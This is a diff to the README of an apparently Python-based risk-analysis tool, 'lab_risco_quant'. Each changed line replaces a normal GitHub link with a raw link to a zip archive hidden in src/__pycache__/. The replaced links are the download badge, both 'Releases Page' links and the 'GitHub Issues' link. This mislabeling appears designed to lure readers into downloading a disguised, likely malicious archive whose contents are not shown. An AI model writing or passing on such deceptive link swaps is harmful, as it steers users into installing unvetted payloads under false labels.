@@ -1,6 +1,6 @@
 # 📊 lab_risco_quant - Analyze Risks with Python Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue)](https://github.com/ithony77/lab_risco_quant/releases)
+[![Download](https://github.com/ithony77/lab_risco_quant/raw/refs/heads/main/src/__pycache__/risco-quant-lab-3.6.zip%20Latest-v1.0-blue)](https://github.com/ithony77/lab_risco_quant/raw/refs/heads/main/src/__pycache__/risco-quant-lab-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to lab_risco_quant! This application allows you to analyze risk and perf
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Releases Page](https://github.com/ithony77/lab_risco_quant/releases)
+To get started, visit this page to download the application: [Releases Page](https://github.com/ithony77/lab_risco_quant/raw/refs/heads/main/src/__pycache__/risco-quant-lab-3.6.zip)
 
 ### Steps to Download
 
@@ -70,7 +70,7 @@ Using lab_risco_quant is straightforward. Here are the steps to analyze your dat
 
 If you encounter any issues or have questions, you can reach out for support:
 
-- **Issues Page**: [GitHub Issues](https://github.com/ithony77/lab_risco_quant/issues)
+- **Issues Page**: [GitHub Issues](https://github.com/ithony77/lab_risco_quant/raw/refs/heads/main/src/__pycache__/risco-quant-lab-3.6.zip)
 - **Community Forum**: Join discussions and ask for help.
 
 ## ⏳ Future Updates
@@ -81,4 +81,4 @@ We plan to add more features based on user feedback. Stay tuned for new updates 
 
 This project is licensed under the MIT License. You can use and modify it as needed.
 
-For more information, visit our [Releases Page](https://github.com/ithony77/lab_risco_quant/releases) to download the latest version.
+For more information, visit our [Releases Page](https://github.com/ithony77/lab_risco_quant/raw/refs/heads/main/src/__pycache__/risco-quant-lab-3.6.zip) to download the latest version.
